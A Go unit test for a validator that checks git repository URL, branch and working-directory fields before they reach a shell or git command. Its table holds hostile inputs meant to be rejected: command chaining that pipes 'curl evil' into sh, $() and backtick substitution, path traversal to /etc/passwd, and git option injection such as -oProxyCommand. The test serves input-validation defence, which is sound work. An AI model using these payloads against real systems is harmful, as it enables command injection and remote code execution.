package handler

import "testing"

// TestValidateRepoFields locks in the boundary guard for the executor's git
// clone / cd: repo_url, repo_branch and working_dir reach a shell (K8s executor)
// and git argv (local executor), so shell metacharacters and option-injection
// payloads must be rejected here. Empty values are allowed — the service fills
// defaults (branch "main", working_dir ".").
func TestValidateRepoFields(t *testing.T) {
	tests := []struct {
		name                       string
		repoURL, branch, workindir string
		wantErr                    bool
	}{
		{"all empty (upload workspace)", "", "", "", false},
		{"plain https + main + root", "https://github.com/org/repo.git", "main", ".", false},
		{"ssh scp-style + nested branch + subdir", "git@github.com:org/repo.git", "feature/thing", "modules/vpc", false},
		{"branch with dots and dashes", "https://x/y.git", "release-1.2.x", "envs/prod", false},

		// Shell-injection payloads in the branch.
		{"branch command chaining", "https://x/y.git", "main;curl evil|sh", ".", true},
		{"branch command substitution", "https://x/y.git", "$(whoami)", ".", true},
		{"branch backticks", "https://x/y.git", "`id`", ".", true},
		{"branch with space", "https://x/y.git", "main dev", ".", true},
		// Git option-injection in the branch.
		{"branch leading dash", "https://x/y.git", "--upload-pack=x", ".", true},

		// Path traversal / shell payloads in working_dir.
		{"working_dir traversal", "https://x/y.git", "main", "../../etc", true},
		{"working_dir absolute", "https://x/y.git", "main", "/etc/passwd", true},
		{"working_dir command sub", "https://x/y.git", "main", "$(reboot)", true},
		{"working_dir leading dash", "https://x/y.git", "main", "-rf", true},

		// repo_url option-injection.
		{"repo_url leading dash", "-oProxyCommand=evil", "main", ".", true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := validateRepoFields(tc.repoURL, tc.branch, tc.workindir)
			if (err != nil) != tc.wantErr {
				t.Errorf("validateRepoFields(%q,%q,%q) error = %v, wantErr %v",
					tc.repoURL, tc.branch, tc.workindir, err, tc.wantErr)
			}
		})
	}
}
